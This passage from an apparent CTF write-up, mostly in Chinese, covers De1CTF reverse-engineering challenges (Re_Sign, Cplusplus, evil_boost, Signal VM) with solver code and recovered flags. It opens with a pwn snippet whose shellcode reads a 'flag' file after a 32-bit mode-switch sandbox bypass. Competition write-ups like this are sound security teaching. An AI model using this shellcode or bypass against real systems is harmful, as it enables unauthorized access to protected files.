&lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt; /* mmap() is defined in this header */</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned char shellcode[]= \</span><br><span class="line">&quot;\x6a\x01\xfe\x0c\x24\x68\x66\x6c\x61\x67\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x68\x00\x38\x12\x00\x59\x89\xc3\xba\x00\x01\x00\x00\x6a\x03\x58\xcd\x80\xbb\x01\x00\x00\x00\xb9\x00\x38\x12\x00\xba\x00\x01\x00\x00\x6a\x04\x58\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80&quot;;</span><br><span class="line">/*</span><br><span class="line">push   0x1</span><br><span class="line">dec    BYTE PTR [esp]</span><br><span class="line">push   0x67616c66</span><br><span class="line">mov    ebx,esp</span><br><span class="line">xor    ecx,ecx</span><br><span class="line">xor    edx,edx</span><br><span class="line">push   0x5</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">push   0x123800</span><br><span class="line">pop    ecx</span><br><span class="line">mov    ebx,eax</span><br><span class="line">mov    edx,0x100</span><br><span class="line">push   0x3</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">mov    ebx,0x1</span><br><span class="line">mov    ecx,0x123800</span><br><span class="line">mov    edx,0x100</span><br><span class="line">push   0x4</span><br><span class="line">pop    eax</span><br><span class="line">int    0x80</span><br><span class="line">mov    eax,0x1</span><br><span class="line">int    0x80</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">unsigned char bypass[] = \</span><br><span class="line">&quot;\x48\x31\xe4\xbc\x00\x34\x12\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x00\x30\x12\x00\xcb&quot;;</span><br><span class="line">/*</span><br><span class="line">xor rsp,rsp</span><br><span class="line">mov esp,0x123400</span><br><span class="line">mov    DWORD PTR [esp+0x4],0x23</span><br><span class="line">mov    DWORD PTR [esp],0x123000</span><br><span class="line">retf</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char* p1=mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    char* p2=mmap((void*)0x123000,0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    memcpy(p1,bypass,sizeof(bypass));</span><br><span class="line">    memcpy(p2,shellcode,sizeof(shellcode));</span><br><span class="line">    int (*ret)() = (int(*)())p1;</span><br><span class="line">    ret();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="re">re</span></h1><h2><span id="re_sign">Re_Sign</span></h2><h4><span id="exp">exp</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int int32_41E3D0[] = &#123; 8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31, 43, 36, 3, 21, 65, 65 &#125;;</span><br><span class="line">char str_41E499[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;</span><br><span class="line">char base64_C[49] = &#123;0&#125;;</span><br><span class="line">for (int i = 0; i &lt; 48; i++)</span><br><span class="line">&#123;</span><br><span class="line">int temp_index = int32_41E3D0[i];</span><br><span class="line">base64_C[i] = str_41E499[temp_index - 1];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt;&quot;base64_C:&quot;&lt;&lt; base64_C &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char psss_list[65] = &#123; 0 &#125;;</span><br><span class="line">char list_41E380[] = &#123; 48, 48, 48, 48, 48, 48, 48, 48, 48, 48, 91, 92, 73, 95, 90, 86, 69, 88, 93, 67, 85, 70, 82, 81, 95, 81, 80, 80, 80, 71, 70, 92, 118, 99, 108, 110, 85, 82, 67, 85, 92, 80, 95, 66, 67, 93, 79, 92, 84, 87, 85, 91, 94, 94, 90, 77, 64, 90, 76, 89, 82, 80, 21, 16 &#125;;</span><br><span class="line">for (int i = 0; i &lt;64; i++)</span><br><span class="line">&#123;</span><br><span class="line">psss_list[i] = list_41E380[i] ^ i;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; &quot;psss_list:&quot; &lt;&lt; psss_list &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">char str_re[100] = &#123;0&#125;;</span><br><span class="line">Base64_decode(base64_C, psss_list, str_re);</span><br><span class="line">cout &lt;&lt; &quot;flag:&quot; &lt;&lt; str_re &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="output">output</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64_C:H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU==</span><br><span class="line">psss_list:0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/</span><br><span class="line">flag:de1ctf&#123;E_L4nguag3_1s_K3KeK3_N4Ji4&#125;</span><br></pre></td></tr></table></figure><h2><span id="cplusplus">Cplusplus</span></h2><blockquote><p>源代码<code>Cplusplus.cpp</code></p><p>附件<code>Cplusplus.exe</code></p><p>编译<code>compile.txt</code></p></blockquote><h4><span id="分析">分析</span></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> num1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> num2;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> num3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">st <span class="title">boostFn</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> boost::spirit::qi::_1;</span><br><span class="line"><span class="keyword">using</span> boost::spirit::qi::ushort_;</span><br><span class="line"><span class="keyword">using</span> boost::spirit::qi::char_;</span><br><span class="line"><span class="keyword">using</span> boost::phoenix::ref;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> <span class="title">res</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* first = s.data();</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> end = first + s.size();</span><br><span class="line"><span class="keyword">bool</span> success = boost::spirit::qi::parse(first, end,</span><br><span class="line">ushort_[ref(res.num1) = _1] &gt;&gt; <span class="keyword">char</span>(<span class="string">'@'</span>)</span><br><span class="line">&gt;&gt; ushort_[ref(res.num2) = _1] &gt;&gt; <span class="keyword">char</span>(<span class="string">'#'</span>)</span><br><span class="line">&gt;&gt; ushort_[ref(res.num3) = _1]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!success || first != end) &#123;</span><br><span class="line"><span class="comment">//throw std::logic_error("Parsing failed");</span></span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是<code>boost::spirit</code>相关，输入形如<code>num1@num2#num3</code>，用<code>@ #</code>分割三个<code>unsigned short</code>数值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">boostFunc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span>&amp; num)</span> </span>&#123;</span><br><span class="line"><span class="comment">//随机数check</span></span><br><span class="line"><span class="comment">//预期的num是78</span></span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">111</span>) &#123;</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">boost::<span class="function">mt19937 <span class="title">rng</span><span class="params">(num)</span></span>;</span><br><span class="line">rng.discard(num % <span class="number">12</span>);</span><br><span class="line"><span class="comment">//拷贝构造，保留了所有状态</span></span><br><span class="line">boost::<span class="function">mt19937 <span class="title">rng_</span><span class="params">(rng)</span></span>;</span><br><span class="line">rng_.discard(num / <span class="number">12</span>);</span><br><span class="line"><span class="comment">//这里相当于丢弃了num个随机结果</span></span><br><span class="line"><span class="keyword">if</span> (rng_() != <span class="number">3570126595</span>) &#123;</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">num -= (rng_() % <span class="number">45</span>);<span class="comment">// 45</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个<code>unsigned short</code>传入，小于等于111，把它作为随机引擎的种子，丢弃掉<code>num % 12</code>个随机数，然后用一次随机引擎的拷贝构造</p><blockquote><p>注意，这里拷贝构造会完全保留随机引擎的状态，而不是回归初始状态</p><p>在IDA中就表现为直接一个memcpy</p></blockquote><p>接着再丢弃掉<code>num/12</code>个随机数</p><p>然后输出一个随机数要求等于<code>3570126595</code>，最后由于是引用，传入的数值被改变</p><p>后面第二段check没什么好说的</p><p>第三段check是我的锅</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((res.num3 % res.num1 != <span class="number">12</span>) &amp;&amp; (res.num3 / res.num1) != <span class="number">3</span>) &#123;</span><br><span class="line"><span class="comment">//3 * 34 + 12 == 114</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You failed...again"</span>;</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里出现了多解，后来排查发现是<code>||</code>被我误写为<code>&amp;&amp;</code>，因此只要满足右边的式子就会输出flag，最后加上了<code>md5</code>保证唯一解</p><h2><span id="evil_boost">evil_boost</span></h2><blockquote><p>源代码<code>evil_boost.cpp</code></p><p>附件<code>evil_boost.exe</code></p><p>编译<code>compile.txt</code></p></blockquote><h4><span id="分析">分析</span></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;boost/phoenix/phoenix.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> opt = boost::program_options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> boost::spirit;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> phoenix;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Have you input your name??"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">opt::<span class="function">options_description <span class="title">desc</span><span class="params">(<span class="string">"All options"</span>)</span></span>;</span><br><span class="line">desc.add_options()</span><br><span class="line">(<span class="string">"cplusplus,cpp"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">99</span>), <span class="string">"your C++ grades"</span>)</span><br><span class="line">(<span class="string">"python,py"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">88</span>), <span class="string">"your python grades"</span>)</span><br><span class="line">(<span class="string">"javascript,js"</span>, opt::value&lt;<span class="keyword">int</span>&gt;()-&gt;default_value(<span class="number">77</span>), <span class="string">"your javascript grades"</span>)</span><br><span class="line">(<span class="string">"name"</span>, opt::value&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(), <span class="string">"your name"</span>)</span><br><span class="line">(<span class="string">"help"</span>, <span class="string">"produce help message"</span>);</span><br><span class="line">opt::variables_map vm;</span><br><span class="line"><span class="comment">//解析命令行选项并把值存储到"vm"</span></span><br><span class="line">opt::store(opt::parse_command_line(argc, argv, desc), vm);</span><br><span class="line">opt::notify(vm);</span><br></pre></td></tr></table></figure><p>如代码所示，解析命令行参数并存储</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (vm.count(<span class="string">"name"</span>)) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> __name = vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;();</span><br><span class="line"><span class="keyword">char</span> c1 = vm[<span class="string">"cplusplus"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line"><span class="keyword">char</span> c2 = vm[<span class="string">"python"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line"><span class="keyword">char</span> c3 = vm[<span class="string">"javascript"</span>].as&lt;<span class="keyword">int</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vm[<span class="string">"cplusplus"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">999</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (vm[<span class="string">"python"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">777</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (vm[<span class="string">"javascript"</span>].as&lt;<span class="keyword">int</span>&gt;() == <span class="number">233</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc_false_flag[<span class="number">25</span>] = &#123;</span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x6b</span>,<span class="number">0x38</span>,<span class="number">0x71</span>,<span class="number">0x6b</span>,<span class="number">0x38</span>,<span class="number">0x6c</span>,</span><br><span class="line"><span class="number">0x70</span>,<span class="number">0x7d</span>,<span class="number">0x38</span>,<span class="number">0x6f</span>,<span class="number">0x6a</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0x7f</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0x7e</span>,<span class="number">0x74</span>,<span class="number">0x79</span>,<span class="number">0x7f</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x36</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)__name[i] ^ (<span class="keyword">char</span>)(c1 + c2 * c3)) != enc_false_flag[i]) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">_exit(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You get the flag! flag&#123;"</span> &lt;&lt; __name &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//flag&#123;This is the wrong flag...&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输入了name，会获得cpp、python、JavaScript的成绩，然后解密flag，最后输出一个假的flag</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 计算表达式相关 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//为rule准备一个val变量，类型为double</span></span><br><span class="line"><span class="comment">//准确的说：是一个phoenix类，它和其它的phoenix类组成lambda表达式，在lambda里可以看作一个double</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">calc_closure</span> :</span>boost::spirit::closure&lt;calc_closure, <span class="keyword">double</span>&gt; &#123;</span><br><span class="line">member1 val;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//定义ContextT策略为calc_closure::context_t</span></span><br><span class="line">rule&lt;<span class="keyword">phrase_scanner_t</span>, calc_closure::<span class="keyword">context_t</span>&gt; factor, term, <span class="built_in">exp</span>;</span><br><span class="line"><span class="comment">//直接使用phoenix的lambda表达式作为Actor</span></span><br><span class="line">factor = real_p[factor.val = arg1] | (<span class="string">'('</span> &gt;&gt; <span class="built_in">exp</span>[factor.val = arg1] &gt;&gt; <span class="string">')'</span>);</span><br><span class="line">term = factor[term.val = arg1] &gt;&gt; *((<span class="string">'*'</span> &gt;&gt; factor[term.val *= arg1]) | (<span class="string">'/'</span> &gt;&gt; factor[term.val /= arg1]));</span><br><span class="line"><span class="built_in">exp</span> = term[<span class="built_in">exp</span>.val = arg1] &gt;&gt; *((<span class="string">'+'</span> &gt;&gt; term[<span class="built_in">exp</span>.val += arg1]) | (<span class="string">'-'</span> &gt;&gt; term[<span class="built_in">exp</span>.val -= arg1]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* szExp = vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;().c_str();</span><br><span class="line"><span class="keyword">double</span> result;</span><br><span class="line">parse_info&lt;&gt;r = parse(szExp, <span class="built_in">exp</span>[assign_a(result)], space_p);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5e0*(5-1/5)==24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(szExp) != <span class="number">11</span>) &#123;</span><br><span class="line">_exit(<span class="built_in">strlen</span>(szExp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> count_alpha = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szExp); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((szExp[i] &lt; <span class="string">'9'</span>) &amp;&amp; (szExp[i] &gt;= <span class="string">'0'</span>)) &#123;</span><br><span class="line">count_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] &gt; <span class="string">'a'</span>) &amp;&amp; (szExp[i] &lt; <span class="string">'z'</span>)) &#123;</span><br><span class="line">count_alpha++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] &gt; <span class="string">'A'</span>) &amp;&amp; (szExp[i] &lt; <span class="string">'Z'</span>)) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"GG..."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">Sleep(<span class="number">100000000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((szExp[i] != <span class="string">'-'</span>) &amp;&amp; (szExp[i] != <span class="string">'*'</span>) &amp;&amp; (szExp[i] != <span class="string">'('</span>)</span><br><span class="line">&amp;&amp; (szExp[i] != <span class="string">')'</span>) &amp;&amp; (szExp[i] != <span class="string">'/'</span>)) &#123;</span><br><span class="line">_exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//只能有5个数字和1个小写字母，就是'e'</span></span><br><span class="line"><span class="keyword">if</span> ((count_num != <span class="number">5</span>) || (count_alpha != <span class="number">1</span>)) &#123;</span><br><span class="line">_exit(count_num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((szExp[<span class="number">1</span>] &lt; <span class="string">'a'</span>) || (szExp[<span class="number">1</span>] &gt; <span class="string">'z'</span>)) &#123;</span><br><span class="line">Sleep(<span class="number">10000000</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You failed!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result - <span class="number">24</span> &lt; <span class="number">0.0000001</span> || result - <span class="number">24</span> &gt; <span class="number">0.0000001</span>) &#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"You finally get sth."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Maybe you missed a code branch..."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"MD5 is 293316bfd246fa84e566d7999df88e79,You should check it!"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"de1ctf&#123;"</span> &lt;&lt; vm[<span class="string">"name"</span>].as&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;() &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>长度为11,5个数字，1个小写字母(只能是e)</p><p>因为只能使用乘除减，5551是比较容易想到的，但也不排除可能有其他解，给出了md5</p><p>根据浮点数的计算<code>(result - 24 &lt; 0.0000001 || result - 24 &gt; 0.0000001)</code>很容易反推是在计算 24点，最后输入的name就是flag</p><h2><span id="signal-vm-signal-vm-δ">Signal vm + Signal vm Δ</span></h2><p>通过异常进入各种handler，从而实现虚拟机。</p><p>参考了强网杯2018的题目 obf ，基于这道题的基础上魔改了一下。</p><p>我找不到官方wp了 ，所以只好把原题贴一下，感兴趣的可以看看。</p><h4><span id="流程">流程</span></h4><p>先fork出一个子进程，父进程会调试子进程，子进程会进入各种由异常组成的bytecode，父进程根据异常的类型进行各种虚拟机操作。</p><p>Signal VM 和Signal VM Δ 不同的一点在于，第一题直接对父进程本身的数据进行操作，子进程只是起到传达code的作用</p><p>第二题使用PTRACE_PEEKTEXT 和PTRACE_POKETEXT，直接修改子进程的内存。</p><p>这样在我们调试父进程的时候，在第一题中可以直接监视VM寄存器和VM的内存，从而帮助我们理解指令。</p><p>而在第二题中，由于子进程已经被父进程调试了，我们无法附加上去，无法查看子进程的内存，只能查看父进程调试获取的数据，加大了理解指令的难度，分析解析指令这一部分更为重要。</p><h4><span id="指令">指令</span></h4><p>指令大致分为三部分：opcode， 操作数类型，操作数</p><p>除了int 3断点，还添加了三种不同的异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">signal    | machine code | handler</span><br><span class="line">-------------------------------------------</span><br><span class="line">SIGILL    | 06           | mov, lea ...</span><br><span class="line">SIGTRAP   | CC           | add, sub, mul div ...</span><br><span class="line">SIGSEGV   | 00 00        | jcc</span><br><span class="line">SIGFPE    | 30 C0 F6 F8  | cmp</span><br></pre></td></tr></table></figure><p>opcode之后有一个字节用来标识操作数的类型（除了jcc）</p><p>高 4 bit代表第一个操作数，低 4 bit代表第二个操作数，其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0  register</span><br><span class="line">1  immediate</span><br><span class="line">2  address</span><br></pre></td></tr></table></figure><p>地址只能是由寄存器指向，第一个操作数不能为立即数，立即数位32位</p><p>在这之后是两个操作数，应当根据操作数类型进行匹配。寄存器占一个字节，立即数占四个字节。</p><h4><span 